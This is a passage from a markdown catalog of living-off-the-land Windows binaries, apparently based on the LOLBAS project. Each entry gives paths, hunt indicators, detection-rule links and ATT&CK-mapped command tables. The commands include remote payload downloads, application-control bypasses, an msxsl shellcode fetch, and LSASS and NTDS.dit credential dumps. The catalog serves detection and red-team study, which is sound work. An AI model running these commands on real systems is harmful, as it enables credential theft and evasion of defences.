| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.001` | `Administrator` | `DumpMinitool.exe --file c:\users\mr.d0x\dump.txt --processId 1132 --dumpType Full` | Create memory dump and parse it offline |

### `Dxcap.exe` (`yml/OtherMSBinaries/Dxcap.yml`)
- **Description:** DirectX diagnostics/debugger included with Visual Studio.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Dxcap.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Dxcap.yml`
- **Default Windows Paths:** `C:\Windows\System32\dxcap.exe`, `C:\Windows\SysWOW64\dxcap.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_susp_dxcap.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `Dxcap.exe -c C:\Windows\System32\notepad.exe` | Local execution of a process as a subprocess of dxcap.exe |

### `Excel.exe` (`yml/OtherMSBinaries/Excel.yml`)
- **Description:** Microsoft Office binary
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Excel.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Excel.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Excel.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Excel.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Excel.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\Excel.exe`, `C:\Program Files\Microsoft Office\Office16\Excel.exe` (+11 more)
- **Key Forensic / Hunt IOCs:** `Suspicious Office application Internet/network traffic`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `Excel.exe http://192.168.1.10/TeamsAddinLoader.dll` | It will download a remote payload and place it in INetCache. |

### `Fsi.exe` (`yml/OtherMSBinaries/Fsi.yml`)
- **Description:** 64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Fsi.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Fsi.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Fsi.yml`
- **Default Windows Paths:** `C:\Program Files\dotnet\sdk\[sdk version]\FSharp\fsi.exe`, `C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\CommonExtensions\Microsoft\FSharp\fsi.exe`
- **Key Forensic / Hunt IOCs:** `Fsi.exe execution may be suspicious on non-developer machines`
- **Detection Rules:** [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_fsharp_interpreters.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1059` | `User` | `fsi.exe c:\path\to\test.fsscript` | Execute payload with Microsoft signed binary to bypass WDAC policies |
| **AWL Bypass** | `T1059` | `User` | `fsi.exe` | Execute payload with Microsoft signed binary to bypass WDAC policies |

### `FsiAnyCpu.exe` (`yml/OtherMSBinaries/FsiAnyCpu.yml`)
- **Description:** 32/64-bit FSharp (F#) Interpreter included with Visual Studio.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/FsiAnyCpu.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/FsiAnyCpu.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/FsiAnyCpu.yml`
- **Default Windows Paths:** `c:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\CommonExtensions\Microsoft\FSharp\fsianycpu.exe`
- **Key Forensic / Hunt IOCs:** `FsiAnyCpu.exe execution may be suspicious on non-developer machines`
- **Detection Rules:** [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_fsharp_interpreters.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1059` | `User` | `fsianycpu.exe c:\path\to\test.fsscript` | Execute payload with Microsoft signed binary to bypass WDAC policies |
| **AWL Bypass** | `T1059` | `User` | `fsianycpu.exe` | Execute payload with Microsoft signed binary to bypass WDAC policies |

### `Mftrace.exe` (`yml/OtherMSBinaries/Mftrace.yml`)
- **Description:** Trace log generation tool for Media Foundation Tools.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Mftrace.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Mftrace.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x86`, `C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64`, `C:\Program Files (x86)\Windows Kits\10\bin\x86`, `C:\Program Files (x86)\Windows Kits\10\bin\x64`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_mftrace.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `Mftrace.exe cmd.exe` | Local execution of cmd.exe as a subprocess of Mftrace.exe. |
| **Execute** | `T1127` | `User` | `Mftrace.exe powershell.exe` | Local execution of powershell.exe as a subprocess of Mftrace.exe. |

### `Microsoft.NodejsTools.PressAnyKey.exe` (`yml/OtherMSBinaries/Microsoft.NodejsTools.PressAnyKey.yml`)
- **Description:** Part of the NodeJS Visual Studio tools.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Microsoft.NodejsTools.PressAnyKey.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Microsoft.NodejsTools.PressAnyKey.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Microsoft.NodejsTools.PressAnyKey.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Visual Studio\*\Community\Common7\IDE\Extensions\Microsoft\NodeJsTools\NodeJsTools\Microsoft.NodejsTools.PressAnyKey.exe`, `C:\Program Files (x86)\Microsoft Visual Studio\*\Community\Common7\IDE\Extensions\Microsoft\NodeJsTools\NodeJsTools\Microsoft.NodejsTools.PressAnyKey.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_renamed_pressanykey.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_pressanykey_lolbin_execution.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `Microsoft.NodejsTools.PressAnyKey.exe normal 1 cmd.exe` | Spawn a new process via Microsoft.NodejsTools.PressAnyKey.exe. |

### `MSAccess.exe` (`yml/OtherMSBinaries/Msaccess.yml`)
- **Description:** Microsoft Office component
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Msaccess.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Msaccess.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Msaccess.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe`, `C:\Program Files\Microsoft Office\Office16\MSAccess.exe` (+10 more)
- **Key Forensic / Hunt IOCs:** `URL on a MSAccess command line`; `MSAccess making unexpected network connections or DNS requests`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `MSAccess.exe https://example.com/payload.exe.mdb` | It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache. |

### `Msdeploy.exe` (`yml/OtherMSBinaries/Msdeploy.yml`)
- **Description:** Microsoft tool used to deploy Web Applications.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Msdeploy.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Msdeploy.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\IIS\Microsoft Web Deploy V3\msdeploy.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_msdeploy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat"` | Local execution of batch file using msdeploy.exe. |
| **AWL Bypass** | `T1218` | `User` | `msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\temp\calc.bat"` | Local execution of batch file using msdeploy.exe. |

### `MsoHtmEd.exe` (`yml/OtherMSBinaries/MsoHtmEd.yml`)
- **Description:** Microsoft Office component
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/MsoHtmEd.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/MsoHtmEd.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/MsoHtmEd.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe`, `C:\Program Files\Microsoft Office\Office16\MSOHTMED.exe` (+11 more)
- **Key Forensic / Hunt IOCs:** `Suspicious Office application internet/network traffic`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `MsoHtmEd.exe https://example.com/payload` | It will download a remote payload and place it in INetCache. |

### `Mspub.exe` (`yml/OtherMSBinaries/Mspub.yml`)
- **Description:** Microsoft Publisher
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Mspub.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Mspub.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Mspub.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe`, `C:\Program Files\Microsoft Office\Office16\MSPUB.exe` (+8 more)
- **Key Forensic / Hunt IOCs:** `Suspicious Office application internet/network traffic`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `mspub.exe https://example.com/payload` | It will download a remote payload and place it in INetCache. |

### `msxsl.exe` (`yml/OtherMSBinaries/Msxsl.yml`)
- **Description:** Command line utility used to perform XSL transformations.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Msxsl.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Msxsl.yml`
- **Default Windows Paths:** `no default`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml), [Elastic](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1220` | `User` | `msxsl.exe customers.xml script.xsl` | Local execution of script stored in XSL file. |
| **AWL Bypass** | `T1220` | `User` | `msxsl.exe customers.xml script.xsl` | Local execution of script stored in XSL file. |
| **Execute** | `T1220` | `User` | `msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml` | Local execution of remote script stored in XSL script stored as an XML file. |
| **AWL Bypass** | `T1220` | `User` | `msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml` | Local execution of remote script stored in XSL script stored as an XML file. |
| **Download** | `T1105` | `User` | `msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>` | Download a file from the internet and save it to disk. |
| **ADS** | `T1564` | `User` | `msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>:ads-name` | Download a file from the internet and save it to an NTFS Alternate Data Stream. |

### `ntdsutil.exe` (`yml/OtherMSBinaries/Ntdsutil.yml`)
- **Description:** Command line utility used to export Active Directory.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Ntdsutil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Ntdsutil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Ntdsutil.yml`
- **Default Windows Paths:** `C:\Windows\System32\ntdsutil.exe`
- **Key Forensic / Hunt IOCs:** `ntdsutil.exe with command line including "ifm"`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_ntdsutil_usage.yml), [Splunk](https://github.com/splunk/security_content/blob/2b87b26bdc2a84b65b1355ffbd5174bdbdb1879c/detections/endpoint/ntdsutil_export_ntds.yml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.003` | `Administrator` | `ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q` | Dumping of Active Directory NTDS.dit database |

### `OpenConsole.exe` (`yml/OtherMSBinaries/OpenConsole.yml`)
- **Description:** Console Window host for Windows Terminal
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/OpenConsole.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/OpenConsole.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/OpenConsole.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\Terminal\ServiceHub\os64\OpenConsole.exe`, `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\Terminal\ServiceHub\os86\OpenConsole.exe`, `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\Terminal\ServiceHub\os64\OpenConsole.exe`
- **Key Forensic / Hunt IOCs:** `OpenConsole.exe spawning unexpected processes`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/9e0ef7251b075f15e7abafbbec16d3230c5fa477/rules/windows/process_creation/proc_creation_win_lolbin_openconsole.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `OpenConsole.exe calc` | Use OpenConsole.exe as a proxy binary to evade defensive counter-measures |

### `Powerpnt.exe` (`yml/OtherMSBinaries/Powerpnt.yml`)
- **Description:** Microsoft Office binary.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Powerpnt.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Powerpnt.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Powerpnt.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe`, `C:\Program Files\Microsoft Office\Office16\Powerpnt.exe` (+11 more)
- **Key Forensic / Hunt IOCs:** `Suspicious Office application Internet/network traffic`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"` | It will download a remote payload and place it in INetCache. |

### `Procdump.exe` (`yml/OtherMSBinaries/Procdump.yml`)
- **Description:** SysInternals Memory Dump Tool
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Procdump.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Procdump.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Procdump.yml`
- **Default Windows Paths:** `no default`
- **Key Forensic / Hunt IOCs:** `Process creation with given '-md' parameter`; `Anomalous child processes of procdump`; `Unsigned DLL load via procdump.exe or procdump64.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_renamed_sysinternals_procdump.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_procdump.yml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `procdump.exe -md calc.dll explorer.exe` | Performs execution of unsigned DLL. |
| **Execute** | `T1202` | `User` | `procdump.exe -md calc.dll foobar` | Performs execution of unsigned DLL. |

### `ProtocolHandler.exe` (`yml/OtherMSBinaries/ProtocolHandler.yml`)
- **Description:** Microsoft Office binary
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/ProtocolHandler.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/ProtocolHandler.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/ProtocolHandler.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe`, `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe`, `C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe`, `C:\Program Files\Microsoft Office\Office16\ProtocolHandler.exe` (+4 more)
- **Key Forensic / Hunt IOCs:** `Suspicious Office application Internet/network traffic`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `ProtocolHandler.exe https://example.com/payload` | It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction) |

### `rcsi.exe` (`yml/OtherMSBinaries/Rcsi.yml`)
- **Description:** Non-Interactive command line inerface included with Visual Studio.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Rcsi.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Rcsi.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Rcsi.yml`
- **Default Windows Paths:** `no default`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [BlockRule](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `rcsi.exe bypass.csx` | Local execution of arbitrary C# code stored in local CSX file. |
| **AWL Bypass** | `T1127` | `User` | `rcsi.exe bypass.csx` | Local execution of arbitrary C# code stored in local CSX file. |

### `Remote.exe` (`yml/OtherMSBinaries/Remote.yml`)
- **Description:** Debugging tool included with Windows Debugging Tools
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Remote.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Remote.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Remote.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe`, `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe`
- **Key Forensic / Hunt IOCs:** `remote.exe process spawns`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127` | `User` | `Remote.exe /s "powershell.exe" anythinghere` | Executes a process under a trusted Microsoft signed binary |
| **Execute** | `T1127` | `User` | `Remote.exe /s "powershell.exe" anythinghere` | Executes a process under a trusted Microsoft signed binary |
| **Execute** | `T1127` | `User` | `Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere` | Executing a remote binary without saving file to disk |

### `Sqldumper.exe` (`yml/OtherMSBinaries/Sqldumper.yml`)
- **Description:** Debugging utility included with Microsoft SQL.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Sqldumper.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Sqldumper.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft SQL Server\90\Shared\SQLDumper.exe`, `C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analysis\AS OLEDB\140\SQLDumper.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_susp_sqldumper_activity.yml), [Elastic](https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003` | `Administrator` | `sqldumper.exe 464 0 0x0110` | Dump process using PID. |
| **Dump** | `T1003.001` | `Administrator` | `sqldumper.exe 540 0 0x01100:40` | Dump LSASS.exe to Mimikatz compatible dump using PID. |

### `Sqlps.exe` (`yml/OtherMSBinaries/Sqlps.yml`)
- **Description:** Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershell v2. Microsoft SQL Server\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Sqlps.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Sqlps.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Sqlps.yml`
- **Default Windows Paths:** `C:\Program files (x86)\Microsoft SQL Server\100\Tools\Binn\sqlps.exe`, `C:\Program files (x86)\Microsoft SQL Server\110\Tools\Binn\sqlps.exe`, `C:\Program files (x86)\Microsoft SQL Server\120\Tools\Binn\sqlps.exe`, `C:\Program files (x86)\Microsoft SQL Server\130\Tools\Binn\sqlps.exe` (+1 more)
